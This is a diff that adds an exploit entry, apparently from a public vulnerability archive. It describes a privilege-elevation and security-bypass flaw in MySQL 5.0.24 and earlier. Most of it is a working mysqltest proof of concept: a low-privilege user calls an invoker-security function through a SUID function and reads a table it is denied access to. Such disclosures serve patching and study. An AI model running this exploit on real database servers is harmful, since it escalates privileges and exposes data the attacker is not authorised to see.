@@ -1,0 +1,63 @@
+source: http://www.securityfocus.com/bid/19559/info
+
+MySQL is prone to these vulnerabilities:
+
+- A privilege-elevation vulnerability. A user with privileges to execute SUID routines may gain elevated privileges by executing certain commands and code with higher privileges.
+
+- A security-bypass vulnerability. A user can bypass restrictions and create new databases.
+
+MySQL 5.0.24 and prior versions are affected by these issues.
+
+--disable_warnings
+drop database if exists mysqltest1;
+drop database if exists mysqltest2;
+drop function if exists f_suid;
+--enable_warnings
+
+# Prepare playground
+create database mysqltest1;
+create database mysqltest2;
+create user malory@localhost;
+grant all privileges on mysqltest1.* to malory@localhost;
+
+# Create harmless (but SUID!) function
+create function f_suid(i int) returns int return 0;
+grant execute on function test.f_suid to malory@localhost;
+
+use mysqltest2;
+# Create table in which malory@localhost will be interested but to which
+# he won't have any access
+create table t1 (i int);
+
+connect (malcon, localhost, malory,,mysqltest1);
+
+# Correct malory@localhost don't have access to mysqltest2.t1
+--error ER_TABLEACCESS_DENIED_ERROR
+select * from mysqltest2.t1;
+
+# Create function which will allow to exploit security hole
+delimiter |;
+create function f_evil ()
+  returns int
+  sql security invoker
+begin
+  set @a:= current_user();
+  set @b:= (select count(*) from mysqltest2.t1);
+  return 0;
+end|
+delimiter ;|
+
+# Again correct
+--error ER_TABLEACCESS_DENIED_ERROR
+select f_evil();
+select @a, @b;
+
+# Oops!!! it seems that f_evil() is executed in the context of
+# f_suid() definer, so malory@locahost gets all info that he wants
+select test.f_suid(f_evil());
+select @a, @b;
+
+connection default;
+drop user malory@localhost;
+drop database mysqltest1;
+drop database mysqltest2;
